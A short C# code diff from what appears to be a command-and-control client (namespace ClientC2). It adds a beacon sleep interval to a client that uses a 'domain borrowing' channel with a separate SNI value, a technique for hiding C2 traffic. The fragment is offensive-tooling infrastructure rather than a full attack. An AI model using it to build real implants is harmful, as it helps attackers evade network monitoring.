@@ -12,8 +12,8 @@ namespace ClientC2
         private DomainBorrowingChannel Server => (DomainBorrowingChannel)ServerChannel;
         private BeaconChannel Beacon => (BeaconChannel)BeaconChannel;
 
-        public Client(string url, string sni, int port = 443)
-            : base(new DomainBorrowingChannel(url, sni, port))
+        public Client(string url, string sni, int port = 443, int sleep = 60000)
+            : base(new DomainBorrowingChannel(url, sni, port), sleep)
         {
             BeaconChannel = new BeaconChannel(PipeName);
             ServerChannel = new DomainBorrowingChannel(url, sni, port);
